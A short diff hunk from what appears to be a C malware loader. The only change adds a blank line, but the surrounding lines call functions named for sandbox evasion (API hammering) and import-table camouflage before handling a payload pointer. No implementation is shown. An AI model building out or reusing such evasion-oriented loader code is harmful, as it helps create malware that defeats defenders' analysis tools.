@@ -6,6 +6,7 @@
 int main()
 {
 	ApiHammering(2000);
+
 	IatCamouflage();
 
 	unsigned char* pPayload = NULL;
